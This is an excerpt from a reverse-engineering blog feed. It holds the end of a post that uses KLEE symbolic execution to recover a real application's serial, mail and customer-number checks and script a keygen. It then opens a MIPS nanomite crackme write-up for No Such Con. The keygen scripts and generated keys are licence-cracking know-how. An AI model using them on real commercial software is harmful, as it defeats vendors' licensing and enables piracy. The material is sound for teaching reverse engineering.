    if (mail_digest_table[index + i] == mail_digest)
        return 1;
}
return 0;
</code></pre>

<p>}
```</p>

<p>The <code>check_mail</code> function needs the index in the table as secondary input, so it is not completely independent from the other check function. However, <code>check_mail</code> can be incorporated by our successful test program used before:</p>

<p>```c
// &hellip;</p>

<p>int main(int argc, char* argv[]) {</p>

<pre><code>int serial, valid, index;
klee_make_symbolic(&amp;serial, sizeof(serial), "serial");
license_type = get_license_type(serial);
valid = (license_type == PRO);
// added just now
index = get_index_in_mail_table(serial);
valid &amp;= index &lt;= HEADER_SIZE;

klee_assert(!valid);
</code></pre>

<p>}
```</p>

<p>And if we run it, we get our revised serial number, that satisfies the additional constraint:</p>

<p>```
$ clang -emit-llvm -g -o serial.ll -c serial.c
$ klee &mdash;optimize &mdash;libc=uclibc &mdash;posix-runtime serial.ll
&hellip;
KLEE: ERROR: /work/symbolic/serial.c:21: ASSERTION FAIL: !valid
&hellip;</p>

<p>$ ls klee-last/ | grep err
test000032.assert.err
$ ktest-tool &mdash;write-ints klee-last/test000019.ktest
&hellip;
object    1: name: &lsquo;serial&rsquo;
object    1: data: 120300641
&hellip;
```</p>

<p>For those who are wondering if <code>get_index_in_mail_table</code> could return a negative index, and so possibly crash the program I can answer that they are not alone. <a href="https://twitter.com/0vercl0k">@0vercl0k</a> asked me the same question, and unfortunately I have to answer a no. I tried, because I am a lazy ass, by changing the assertion above to <code>klee_assert(index &lt; 0)</code>, but it was not triggered by KLEE. I then manually checked the function&rsquo;s code and I saw a beautiful <code>if (result &lt; 0) result = 0</code>. So, the answer is no! You have not found a vulnerability in the application :(</p>

<p>For the <code>check_mail</code> solution we have to provide the index of a serial, but wait&hellip; we have it! We have now a serial, so, computing the index of the table is simple as executing this:</p>

<p><code>c
int index = get_index_in_mail_table(serial);
</code></p>

<p>Therefore, given a serial number, we can solve the mail address in this way:</p>

<p>```c
// &hellip;</p>

<p>int main(int argc, char* argv[]) {</p>

<pre><code>int serial, valid, index;
char mail[10];

// mail is symbolic
klee_make_symbolic(mail, sizeof(mail), "mail");
for (i = 0; i &lt; sizeof(mail) - 1; ++i)
{
    c = mail[i];
    klee_assume( (c &gt;= '0' &amp; c &lt;= '9') | (c &gt;= 'a' &amp; c &lt;= 'z') | c == '\0' );
}
klee_assume(mail[sizeof(mail) - 1] == '\0');

// get serial as external input
if (argc &lt; 2)
    return 1;
serial = atoi(argv[1]);

// compute index
index = get_index_in_mail_table(serial);
// check validity
valid = check_mail(mail, index);
klee_assert(!valid);
</code></pre>

<p>}
```</p>

<p>We only have to run KLEE with the additional serial argument, providing the computed one by the previous step.</p>

<p><code>
$ clang -emit-llvm -g -o mail.ll -c mail.c
$ klee --optimize --libc=uclibc --posix-runtime mail.ll 120300641
...
KLEE: ERROR: /work/symbolic/mail.c:34: ASSERTION FAIL: !valid
...
$ ls klee-last/ | grep err
test000023.assert.err
$ ktest-tool klee-last/test000023.ktest
...
object    1: name: 'mail'
object    1: data: 'yrwt\x00\x00\x00\x00\x00\x00'
...
</code></p>

<p>OK, the mail found by KLEE is &ldquo;yrwt&rdquo;. This is not a mail, of course, but in the code there is not a proper validation imposing the presence of &lsquo;@&rsquo; and &lsquo;.&rsquo; chars, so we are fine with it :)</p>

<p>The last piece of the puzzle we need is the customer number. Here is the check:</p>

<p>```c
int expected_customer = compute_customer_number(serial, mail);
if (expected_customer != customer_num)</p>

<pre><code>return INVALID;
</code></pre>

<p>```</p>

<p>This is simpler than before, since we already have a serial and a mail, so the only thing missing is a customer number matching those. We can compute it directly, even without symbolic execution:</p>

<p>```c
int main(int argc, char* argv[])
{</p>

<pre><code>if (argc &lt; 3)
    return 1;

int serial = atoi(argv[1]);
char* mail = argv[2];
int customer_number = compute_customer_number(serial, mail);
printf("%d\n", customer_number);
return 0;
</code></pre>

<p>}
```</p>

<p>Let&rsquo;s execute it:</p>

<p><code>
$ gcc customer.c customer
$ ./customer 120300641 yrwt
1175211979
</code></p>

<p>Yeah! And if we try those numbers and mail address onto the real program, we are now legit and registered users :)</p>

<h2>Want more keys?</h2>

<p>We have just found one key, and that&rsquo;s cool, but what about making a keygen? KLEE is deterministic, so if you run the same code over and over you will get always the same results. So, we are now stuck with this single serial.</p>

<p>To solve the problem we have to think about what variables we can move around to get different valid serial numbers to start with, and with them solve related mail addresses and compute a customer number.</p>

<p>We have to add constraints to the serial generation, so that every time we can run a slightly different version of the program and get a different serial number. The simplest thing to do is to constraint <code>get_index_in_mail_table</code> to return an index inside a proper subset of the range [0, <code>HEADER_SIZE</code>] used before. For example we can divide it in equal chunks of size 5 and run the whole thing for every chunk.</p>

<p>This is the modified version of the serial generation:</p>

<p>```c
int main(int argc, char* argv[]) {</p>

<pre><code>int serial, min_index, max_index, valid;

// get chunk bounds as external inputs
if (argc &lt; 3)
    return 1;
min_index= atoi(argv[1]);
max_index= atoi(argv[2]);

// check and assert
index = get_index_in_mail_table(serial);
valid = index &gt;= min_index &amp;&amp; index &lt; max_index;
klee_assert(!valid);
return 0;
</code></pre>

<p>}
```</p>

<p>We now need a script that runs KLEE and collect the results for all those chunks. Here it is:</p>

<p>```bash</p>

<h1>!/bin/bash</h1>

<p>MIN_INDEX=0
MAX_INDEX=8033
STEP=5</p>

<p>echo &ldquo;Index;License;Mail;Customer&rdquo;</p>

<p>for INDEX in $(seq $MIN_INDEX $STEP $MAX_INDEX); do</p>

<pre><code>echo -n "$INDEX;"

CHUNK_MIN=$INDEX
CHUNK_MAX=$(( CHUNK_MIN + STEP ))
LICENSE=$(./solve.sh serial.ll $CHUNK_MIN $CHUNK_MAX)
if [ -z "$LICENSE" ]; then
    echo ";;"
    continue
fi
MAIL_ARRAY=$(./solve.sh mail.ll $LICENSE)
if [ -z "$MAIL_ARRAY" ]; then
    echo ";;"
    continue
fi
MAIL=$(sed 's/\\x00//g' &lt;&lt;&lt; $MAIL_ARRAY | sed "s/'//g")
CUSTOMER=$(./customer $LICENSE $MAIL)

echo "$LICENSE;$MAIL;$CUSTOMER"
</code></pre>

<p>done
```</p>

<p>This script uses the <code>solve.sh</code> script, that does the actual work and prints the result of KLEE runs:</p>

<p>```bash</p>

<h1>!/bin/bash</h1>

<h1>do work</h1>

<p>klee $@ >/dev/null 2>&amp;1</p>

<h1>print result</h1>

<p>ASSERT_FILE=$(ls klee-last | grep .assert.err)
TEST_FILE=$(basename klee-last/$ASSERT_FILE .assert.err)
OUTPUT=$(ktest-tool &mdash;write-ints klee-last/$TEST_FILE.ktest | grep data)
RESULT=$(sed &rsquo;s/.<em>:.</em>: //&lsquo; &lt;&lt;&lt; $OUTPUT)
echo $RESULT</p>

<h1>cleanup</h1>

<p>rm -rf $(readlink -f klee-last)
rm -f klee-last
```</p>

<p>Here is the final run:</p>

<p><code>
$ ./keygen_all.sh
Index;License;Mail;Customer
...
2400;;;
2405;115019227;4h79;1162863222
2410;112625605;7cxd;554797040
...
</code></p>

<p>Note that not all the serial numbers are solvable, but we are OK with that. We now have a bunch of solved registrations. We can put them in some simple GUI that exposes to the user one of them randomly.</p>

<p>That&rsquo;s all folks.</p>

<h1>Conclusion</h1>

<p>This was a brief journey into the magic world of reversing and symbolic execution. We started with the dream to make a key generator for a real world application, and we&rsquo;ve got a list of serial numbers to put in some nice GUI (maybe with some MIDI soundtrack playing in the background to make users crazy). But this was not our purpose. The path we followed is far more interesting than ruining programmer&rsquo;s life. So, just to recap, here are the main steps we followed to generate our serial numbers:</p>

<ol>
<li>reverse the skeleton of the serial number validation procedure, understanding data and the most important functions, using a debugger, IDA, and all the reversing tools we can access;</li>
<li>collect the functions and produce a C version of them (this could be quite difficult, unless you have access to HEX-Rays decompiler or similar tool);</li>
<li>mark some strategic variable as symbolic and mark some strategic code path with an assert;</li>
<li>ask KLEE to provide us the values for symbolic variables that make the assert to fail, and so to reach that code path;</li>
<li>since the last step provides us only a single serial number, add an external input to the symbolic program, using it as additional constraint, in order to get different values for symbolic variables reaching the assert.</li>
</ol>


<p>The last point can be seen as quite obscure, I can admit that, but the idea is simple. Since KLEE&rsquo;s goal is to reach a path with some values for the symbolic variables, it is not interested in exploring all the possibilities for those values. We can force this exploration manually, by adding an additional constraint, and varying a parameter from run to run, and get (hopefully) different correct values for our serial number.</p>

<p>I would like to thank <a href="https://twitter.com/0vercl0k">@0vercl0k</a>, <a href="https://twitter.com/jonathansalwan">@jonathansalwan</a> and <a href="https://twitter.com/__x86">@__x86</a> for their careful proofreading and good remarks!</p>

<p>I hope you found this topic interesting. In the case, here are some links that can be useful for you to deepen some of the arguments touched in this post:</p>

<ul>
<li><a href="http://klee.github.io/">KLEE main site</a> in which you can find documentation, examples and some news;</li>
<li>My <a href="https://registry.hub.docker.com/u/mbrt/klee/">Docker image of KLEE</a> that you can use as is if you want to avoid building KLEE from sources. It is an automated build (sources <a href="https://github.com/mbrt/docker-klee">here</a>) so you can use it safely;</li>
<li>Tutorial on using KLEE onto <a href="http://www.gnu.org/software/coreutils/">GNU Coreutils</a> is <a href="http://klee.github.io/tutorials/testing-coreutils/">here</a> if you want to learn to use better KLEE for testing purposes.</li>
<li>The Feliam&rsquo;s article <a href="https://feliam.wordpress.com/2010/10/07/the-symbolic-maze/">The Symbolic Maze!</a> that gave me insights on how to use KLEE for reversing purposes;</li>
<li>The paper <a href="https://courses.engr.illinois.edu/cs477/king76symbolicexecution.pdf">Symbolic execution and program testing</a> of James C. King gives you a nice intro on symbolic execution topic;</li>
<li>Slides from this <a href="http://www.seas.harvard.edu/courses/cs252/2011sp/slides/Lec13-SymExec.pdf">Harvard course</a> are useful to visualize symbolic execution with nice figures and examples;</li>
<li><a href="http://shell-storm.org/talks/SecurityDay2015_dynamic_symbolic_execution_Jonathan_Salwan.pdf">Dynamic Binary Analysis and Instrumentation Covering a function using a DSE approach</a> by <a href="https://twitter.com/jonathansalwan">Jonathan Salwan</a>.</li>
</ul>


<p>Source code, examples and scripts used to produce this blog post are published in this <a href="https://github.com/mbrt/keygen-post">GitHub repo</a>.</p>

<p>Cheers, <a href="https://twitter.com/brt_device">@brt_device</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Taming a wild nanomite-protected MIPS binary with symbolic execution: No Such Crackme]]></title>
    <link href="http://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme/"/>
    <updated>2014-10-11T21:35:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme</id>
    <content type="html"><![CDATA[<p>As last year, the French conference <a href="http://www.nosuchcon.org/#challenge">No Such Con</a> returns for its second edition in Paris from the 19th of November until the 21th of November. And again, the brilliant <a href="https://twitter.com/elvanderb">Eloi Vanderbeken</a> &amp; his mates at <a href="http://synacktiv.fr/en/index.html">Synacktiv</a> put together a series of three security challenges especially for this occasion.
Apparently, the three tasks have already been <a href="https://twitter.com/Synacktiv/status/515174845844582401">solved</a> by awesome <a href="https://twitter.com/0xf4b">@0xfab</a> which won the competition, hats off :).</p>

<p>To be honest I couldn&rsquo;t resist to try at least the first step, as I know that <a href="https://twitter.com/elvanderb">Eloi</a> always builds <a href="http://0vercl0k.tuxfamily.org/bl0g/?p=253">really twisted</a> and <a href="http://www.nosuchcon.org/2013/#challenge">nice binaries</a> ; so I figured I should just give it a go!</p>

<p>But this time we are trying something different though: this post has been co-authored by both <em>Emilien Girault</em> (<a href="https://twitter.com/emiliengirault">@emiliengirault</a>) and I. As we have slightly different solutions, we figured it would be a good idea to write those up inside a single post. This article starts with an introduction to the challenge and will then fork, presenting my solution and his.</p>

<p>As the article is quite long, here is the complete table of contents:</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>REcon: Here be dragons</h1>

<p>This part is just here to get things started: how to have a debugging environment, to know a bit more about MIPS and to know a bit more what the binary is actually doing.</p>

<h2>MIPS 101</h2>

<p>The first interesting detail about this challenge is that it is a MIPS binary ; it&rsquo;s really kind of exotic for me. I&rsquo;m mainly looking at Intel assembly, so having the opportunity to look at an unknown architecture is always appealing. You know it&rsquo;s like discovering a new little toy, so I just couldn&rsquo;t help myself &amp; started to read the MIPS basics.</p>

<p>This part is going to describe only the essential information you need to both understand and crack wide open the binary ; and as I said I am not a MIPS expert, at all. From what I have seen though, this is fairly similar to what you can see on an Intel x86 CPU:</p>

<ul>
<li>It is <a href="https://en.wikipedia.org/wiki/Endianness#Little-endian">little endian</a> (note that it also exists a big-endian version but it won&rsquo;t be covered in this post),</li>
<li>It has way more general purpose registers,</li>
<li>The calling convention is similar to <a href="http://msdn.microsoft.com/fr-fr/library/6xa169sk.aspx">__fastcall</a>: you pass arguments via registers, and get the return of the function in <em>$v0</em>,</li>
<li>Unlike <a href="https://en.wikipedia.org/wiki/X86">x86</a>, MIPS is <a href="https://en.wikipedia.org/wiki/Reduced_instruction_set_computing">RISC</a>, so much simpler to take in hand (trust me on that one),</li>
<li>Of course, there is an IDA processor,</li>
<li>Linux and the regular tools also exists for MIPS so we will be able to use the &ldquo;normal&rdquo; tools we are used to use,</li>
<li>It also uses a stack, much less than x86 though as most of the things happening are in registers (in the challenge at least).</li>
</ul>


<h2>Setting up a proper debugging environment</h2>

<p>The answer to that question is <a href="http://wiki.qemu.org/Main_Page">Qemu</a>, as expected. You can even download already fully prepared &amp; working Debian images on <a href="https://people.debian.org/~aurel32/qemu/mipsel/">aurel32</a>&rsquo;s website.</p>

<p>```bash get a working qemu environment
overclok@wildout:~/chall/nsc2014$ wget <a href="https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2">https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2</a>
overclok@wildout:~/chall/nsc2014$ wget <a href="https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta">https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</a>
overclok@wildout:~/chall/nsc2014$ cat start_vm.sh
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -vga none -append &ldquo;root=/dev/sda1 console=tty0&rdquo; -nographic
overclok@wildout:~/chall/nsc2014$ ./start_vm.sh
[    0.000000] Initializing cgroup subsys cpuset
[    0.000000] Initializing cgroup subsys cpu
[    0.000000] Linux version 3.2.0-4-4kc-malta (<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x64;&#101;&#98;&#105;&#97;&#110;&#x2d;&#107;&#x65;&#114;&#x6e;&#101;&#108;&#x40;&#x6c;&#x69;&#x73;&#116;&#115;&#46;&#x64;&#x65;&#x62;&#x69;&#x61;&#x6e;&#46;&#x6f;&#x72;&#103;">&#100;&#x65;&#x62;&#x69;&#x61;&#x6e;&#45;&#107;&#x65;&#x72;&#110;&#101;&#x6c;&#64;&#108;&#105;&#x73;&#x74;&#x73;&#x2e;&#100;&#x65;&#98;&#105;&#x61;&#110;&#46;&#x6f;&#114;&#x67;</a>) (gcc version 4.6.3 (Debian 4.6.3-14) ) #1 Debian 3.2.51-1
[&hellip;]
debian-mipsel login: root
Password:
Last login: Sat Oct 11 00:04:51 UTC 2014 on ttyS0
Linux debian-mipsel 3.2.0-4-4kc-malta #1 Debian 3.2.51-1 mips</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@debian-mipsel:~# uname -a
Linux debian-mipsel 3.2.0-4-4kc-malta #1 Debian 3.2.51-1 mips GNU/Linux
```</p>

<p>Feel free to install your essentials in the virtual environment, some tools might come handy (it should take a bit of time to install them though):</p>

<p>```bash aptitude install all-of-the-things
root@debian-mipsel:~# aptitude install strace gdb gcc python
root@debian-mipsel:~# wget <a href="https://raw.githubusercontent.com/zcutlip/gdbinit-mips/master/gdbinit-mips">https://raw.githubusercontent.com/zcutlip/gdbinit-mips/master/gdbinit-mips</a>
root@debian-mipsel:~# mv gdbinit-mips ~/.gdbinit
root@debian-mipsel:~# gdb -q /home/user/crackmips
Reading symbols from /home/user/crackmips&hellip;(no debugging symbols found)&hellip;done.
(gdb) b *main
Breakpoint 1 at 0x402024
(gdb) r &lsquo;doar-e ftw&rsquo;</p>

<h2>Starting program: /home/user/crackmips &lsquo;doar-e ftw&rsquo;</h2>

<p>[registers]
  V0: 7FFF6D30  V1: 77FEE000  A0: 00000002  A1: 7FFF6DF4
  A2: 7FFF6E00  A3: 0000006C  T0: 77F611E4  T1: 0FFFFFFE
  T2: 0000000A  T3: 77FF6ED0  T4: 77FE5590  T5: FFFFFFFF
  T6: F0000000  T7: 7FFF6BE8  S0: 00000000  S1: 00000000
  S2: 00000000  S3: 00000000  S4: 004FD268  S5: 004FD148
  S6: 004D0000  S7: 00000063  T8: 77FD7A5C  T9: 00402024
  GP: 77F67970  S8: 0000006C  HI: 000001A5  LO: 00005E17</p>

<h2>  SP: 7FFF6D18  PC: 00402024  RA: 77DF2208</h2>

<p>[code]
=> 0x402024 <main>:     addiu   sp,sp,-72
   0x402028 &lt;main+4>:   sw      ra,68(sp)
   0x40202c &lt;main+8>:   sw      s8,64(sp)
   0x402030 &lt;main+12>:  move    s8,sp
   0x402034 &lt;main+16>:  sw      a0,72(s8)
   0x402038 &lt;main+20>:  sw      a1,76(s8)
   0x40203c &lt;main+24>:  lw      v1,72(s8)
   0x402040 &lt;main+28>:  li      v0,2
```</p>

<p>And finally you should be able to run the wild beast:</p>

<p><code>bash release the beast
root@debian-mipsel:~# /home/user/crackmips
usage: /home/user/crackmips password
root@debian-mipsel:~# /home/user/crackmips 'doar-e ftw'
WRONG PASSWORD
</code></p>

<p>Brilliant :&ndash;).</p>

<h2>The big picture</h2>

<p>Now that we have a way of both launching and debugging the challenge, we can open the binary in IDA and start to understand what type of protection scheme is used. As always at that point, we are really not interested in details: we just want to understand how
it works and what parts we will have to target to get the <em>good boy</em> message.</p>

<p>After a bit of time in IDA, here is how works the binary:</p>

<ol>
<li> It checks that the user supplied one argument: the serial</li>
<li> It checks that the supplied serial is 48 characters long</li>
<li> It converts the string into 6 <em>DWORD</em>s (/!\ pitfall warning: the conversion is a bit strange, be sure to verify your algorithm)</li>
<li> The beast forks in two:

<ol>
<li>[Father] It seems, somehow, this one is <em>driving</em> the son, more on that later</li>
<li>[Son] After executing a big chunk of code that modifies (in place) the 6 original <em>DWORD</em>s, they get compared against the following string <em>[ Synacktiv + NSC = &lt;3 ]</em></li>
<li>[Son] If the comparison succeeds you win, else you loose</li>
</ol>
</li>
</ol>


<p>Basically, we need to find the 6 input <em>DWORD</em>s that are going to generate the following ones in <em>output</em>: <em>0x7953205b</em>, <em>0x6b63616e</em>, <em>0x20766974</em>, <em>0x534e202b</em>, <em>0x203d2043</em>, <em>0x5d20333c</em>. We also know that the father is going to interact with its son, so we need to study both codes to be sure to understand the challenge properly.
If you prefer code, here is the big picture in C:</p>

<p>```c big picture
int main(int argc, char *argv[])
{</p>

<pre><code>DWORD serial_dwords[6] = {0};
if(argc != 2)
    Usage();

// Conversion
a2i(argv[1], serial_dwords);

pid_t pid = fork();
if(pid != 0)
{
    // Father
    // a lot of stuff going on here, we will see that later on
}
else
{
    // Son
    // a lot of stuff going on here, we will see that later on

    char *clear = (char*)serial_dwords;
    bool win = memcmp(clear, "[ Synacktiv + NSC = &lt;3 ]", 48);
    if(win)
        GoodBoy();
    else
        BadBoy();
}
</code></pre>

<p>}
```</p>

<h1>Let&rsquo;s get our hands dirty</h1>

<h2>Father&rsquo;s in charge</h2>

<p>The first thing I did after having the big picture was to look at the code of the father. Why? The code seemed a bit simpler than the son&rsquo;s one, so I figured studying the father would make more sense to understand what kind of protection we need to subvert.
You can even crank up <a href="http://linux.die.net/man/1/strace">strace</a> to have a clearer overview of the syscalls used:</p>

<p><code>text strace father
root@debian-mipsel:~# strace -i /home/user/crackmips $(python -c 'print "1"*48')
[7734e224] execve("/home/user/crackmips", ["/home/user/crackmips", "11111111111111111111111111111111"...], [/* 12 vars */]) = 0
[...]
[77335e70] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77491068) = 2539
[77335e70] --- SIGCHLD (Child exited) @ 0 (0) ---
[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
[7733557c] --- SIGCHLD (Child exited) @ 0 (0) ---
[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
[7737052c] --- SIGCHLD (Child exited) @ 0 (0) ---
[7733557c] waitpid(2539, [{WIFSTOPPED(s) &amp;&amp; WSTOPSIG(s) == SIGTRAP}], __WALL) = 2539
[7737052c] ptrace(PTRACE_GETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_SETREGS, 2539, 0, 0x7f8f87c4) = 0
[7737052c] ptrace(PTRACE_CONT, 2539, 0, SIG_0) = 0
[...]
</code></p>

<p>That&rsquo;s an interesting output that I didn&rsquo;t expect at all actually. What we are seeing here is the father driving its son by modifying, potentially (we will find out that later), its context every time the son is <em>SIGTRAP</em>ing (note <em>waitpid</em> second argument).</p>

<p>From here, if you are quite familiar with the different existing type of software protections (I&rsquo;m not saying I am an expert in this field but I just happened to know that one :-P) you can pretty much guess what that is: nanomites this is!</p>

<h3>Nanomites 101</h3>

<p>Namomites are quite a nice protection. Though, it is quite a generic name ; you can really use that protection scheme in whatever way you like: your imagination is the only limit here. To be honest, this was the first time I saw this kind of protection implemented on a Unix system ; really good surprise!
It usually works this way:</p>

<ol>
<li> You have two processes: a driver and a driven ; a father and a son</li>
<li> The driver is attaching itself to the driven one with the debug APIs available on the targeted platform (<em>ptrace</em> here, and <em>CreateProcess</em>/<em>DebugActiveProcess</em> on Windows)

<ol>
<li>Note that, by design you won&rsquo;t be able to attach yourself to the son as both Windows and Linux prevent that (by design): some people call that part the <em>DebugBlocker</em></li>
<li>You will able to debug the driver though</li>
</ol>
</li>
<li>  Usually the interesting code is in the son, but again you can do whatever you want. Basically, you have two rules if you want an efficient protection:

<ol>
<li>Make sure the driven process can&rsquo;t run without its driver and that they are really tied to each other</li>
<li> The strength of the protection is that strong/intimate bound between the two processes</li>
<li>Design your algorithm such that <em>removing</em> the driver is really difficult/painful/driving mad the attacker</li>
</ol>
</li>
<li> The driven process can <em>call</em>/<em>notify</em> the driver by just <em>SIGTRAP</em>ing with an <em>int3</em>/<em>break</em> instruction for example</li>
</ol>


<p>As I said, I see this protection scheme more like a <em>recipe</em>: you are free to customize it at your convenience really. If you want to read more on the subject, here is a list of links you should check out:</p>

<ul>
<li><a href="http://www.codeproject.com/Articles/621236/Nanomite-and-Debug-Blocker-for-Linux-Applications">Nanomite and Debug Blocker for Linux Applications</a>: It gives a good overview of how you can get such a protection scheme to work on Linux,</li>
<li><a href="http://blog.w4kfu.com/post/Unpackme_I_am_Famous">Unpackme I am Famous</a>: This shows you what nanomites look like on Windows in a real protected product ; done by my mate <a href="https://twitter.com/w4kfu">@w4kfu</a>,</li>
<li><a href="http://w3challs.com/challenges/cracking">Debug me</a>: Another sweet challenge that uses nanomites on Windows</li>
</ul>


<h3><a id="static_analysis_father"></a> How the father works</h3>

<p>Now it is time to took into details the father ; here is how it works:</p>

<ul>
<li>The first thing it does is to <em>waitpid</em> until its son triggers a <em>SIGTRAP</em></li>
<li>The driver retrieves the CPU context of the son process and more precisely its <em>program counter</em>: <em>$pc</em></li>
<li>Then we have a huge block of arithmetic computations. But after spending a bit of time to study it, we can see that huge block as a black-box function that takes two parameters: the program counter of the son and some kind of counter value (as this code is going to be executed in a loop, for each <em>SIGTRAP</em> this variable is going to be incremented). It generates a single output which is a 32 bits value that I call the <em>first magic value</em>.
Let&rsquo;s not focus on what the block is actually doing though, we will develop some tool in the next part to deal with that :&ndash;) so let&rsquo;s keep moving!</li>
</ul>


<p><img class="center" src="/images/taming_a_wild_nanomite-protected_mips_binary_with_symbolic_execution_no_such_crackme/father_code.png"></p>

<ul>
<li>This <em>magic value</em> is then used to find a specific entry in an array of <em>QWORD</em>s (606 <em>QWORD</em>s which is 6 times the number of <em>break</em> instructions in the son &mdash; you will understand that a bit later don&rsquo;t worry). Basically, the code is going to loop over every single <em>QWORD</em> of this array until finding one that has the high <em>DWORD</em> equals to the <em>magic value</em>. From there you get another <em>magic value</em> which is the lowest <em>DWORD</em> of the matching <em>QWORD</em>.</li>
<li>Another huge block of arithmetic computations is used. Similarly to the first one, we can see it as a black-box function with two inputs: the second <em>magic value</em> and a round index (the son is executing its code 6 times, so this round index will start from 0 until 5 &mdash; again this will be a bit clearer when we look at the son, so just keep this detail in your mind). The output of this function is a 32 bits value. Again, do not study this block, we don&rsquo;t need it.</li>
<li>The generated value is in fact a valid code address inside the son ; so straight after the computation, the father is going to modify the program counter in the previously retrieved CPU context. Once this is done, it calls <em>ptrace</em> with <em>SETREGS</em> to set the new CPU context of the son.</li>
</ul>


<p>This is what roughly is going to be executed every time the son is going to hit a <em>break</em> instruction ; the father is definitely driving the son. And we can feel it now, the son is going to jump (via its father) through block of codes that aren&rsquo;t (necessary) contiguous in memory, so studying the son code as it is in IDA is quite pointless as those basic blocks aren&rsquo;t going to be executed in this order.</p>

<p>Long story short, the nanomites are used as some kind of runtime code flow scrambling primitive, isn&rsquo;t it exciting? Told you that <a href="https://twitter.com/elvanderb">@elvanderb</a> is crazy :&ndash;).</p>

<h2>Gearing up: Writing a symbolic executing engine <a id="writing_symbolic_exec"></a></h2>

<p>At that point, I can assure you that we need some tooling: we have studied the binary, we know how the main parts work and we just need to extract the different equations/formulas used by both the computation of the son&rsquo;s program counter and the serial verification algorithm. Basically the engine is going to be useful to study both the father and the son.</p>

<p>If you are not really familiar with symbolic execution, I recommend you take a little bit of time to read <a href="https://doar-e.github.io/blog/2013/09/16/breaking-kryptonites-obfuscation-with-symbolic-execution/">Breaking Kryptonite&rsquo;s Obfuscation: A Static Analysis Approach Relying on Symbolic Execution</a> and check out <a href="https://github.com/0vercl0k/z3-playground">z3-playground</a> if you are not really familiar with <a href="https://z3.codeplex.com/">Z3</a> and its Python bindings.</p>

<p>This time I decided to not build that engine as an IDA Python script, but just to do everything myself. Do not be afraid though, even if it sounds scary it is really not: the challenge is a perfect environment for those kind of things. It doesn&rsquo;t use a lot of instructions, we don&rsquo;t need to support branches and nearly only arithmetic instructions are used.</p>

<p>I also chose to implement this engine in a way that we can also use it as a simple emulator. You can even use it as a decompiler if you want! The two other interesting points for us are:</p>

<ol>
<li> Once we run a piece of code in the symbolic engine, we will <em>extract</em> certain computations / formulas. Thanks to Microsoft&rsquo;s <a href="https://z3.codeplex.com/">Z3</a> we will be able to retrieve input values that will generate specific output values: this is basically what you gain by using a solver and symbolic variables.</li>
<li> But the other interesting point is that you still can use the extracted <a href="https://z3.codeplex.com/">Z3</a> expressions as some kind of black-box <em>functions</em>. You know what the function is doing, kind of, but you don&rsquo;t know how ; and you are not interested in the how. You know the inputs, and the outputs. To obtain a concrete output value, you can just replace the symbolic variables by concrete values. This is really handy, especially when you are not only interested in finding input values to generate specific output values ; sometimes you just want to go both ways :&ndash;).</li>
</ol>


